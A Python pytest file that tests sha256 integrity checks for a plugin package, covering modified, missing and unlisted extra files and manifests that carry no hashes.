def integrity_manifest(root: Path, files: dict) -> dict:
    return manifest_for(
        integrity={
            "algorithm": "sha256",
            "files": {rel: file_digest(root / rel) for rel in files},
        }
    )


def test_integrity_passes_for_untouched_content(tmp_path: Path) -> None:
    files = {"skills/py-style.md": PLAIN_SKILL}
    root = write_plugin(tmp_path / "p", manifest_for(), files)
    (root / MANIFEST_FILENAME).write_text(
        json.dumps(integrity_manifest(root, files)), encoding="utf-8"
    )
    verify_integrity(root, load_manifest(root))


def test_integrity_catches_a_modified_file(tmp_path: Path) -> None:
    files = {"skills/py-style.md": PLAIN_SKILL}
    root = write_plugin(tmp_path / "p", manifest_for(), files)
    m = parse_manifest(integrity_manifest(root, files))
    (root / "skills" / "py-style.md").write_text("owned", encoding="utf-8")
    with pytest.raises(IntegrityError) as ei:
        verify_integrity(root, m)
    assert "skills/py-style.md" in str(ei.value)
    assert integrity_report(root, m).mismatched == ("skills/py-style.md",)


def test_integrity_catches_a_missing_file(tmp_path: Path) -> None:
    files = {"skills/py-style.md": PLAIN_SKILL}
    root = write_plugin(tmp_path / "p", manifest_for(), files)
    m = parse_manifest(integrity_manifest(root, files))
    (root / "skills" / "py-style.md").unlink()
    with pytest.raises(IntegrityError):
        verify_integrity(root, m)
    assert integrity_report(root, m).missing == ("skills/py-style.md",)


def test_integrity_catches_an_unlisted_extra_file(tmp_path: Path) -> None:
    """Per-file hashes that only cover listed files let an archive add a
    ``tools/evil.py`` nobody hashed. Extra content is a mismatch too."""
    files = {"skills/py-style.md": PLAIN_SKILL}
    root = write_plugin(tmp_path / "p", manifest_for(), files)
    m = parse_manifest(integrity_manifest(root, files))
    (root / "tools").mkdir()
    (root / "tools" / "evil.py").write_text("import os", encoding="utf-8")
    assert integrity_report(root, m).unlisted == ("tools/evil.py",)
    with pytest.raises(IntegrityError):
        verify_integrity(root, m)
    verify_integrity(root, m, allow_unlisted=True)


def test_a_manifest_without_integrity_verifies_vacuously(tmp_path: Path) -> None:
    """Per-file hashes are optional in the format; ``verify_integrity`` says so
    rather than pretending an unhashed plugin was checked."""
    root = write_plugin(tmp_path / "p", manifest_for(), {"skills/py-style.md": PLAIN_SKILL})
    rep = integrity_report(root, load_manifest(root))
    assert not rep.checked and rep.ok
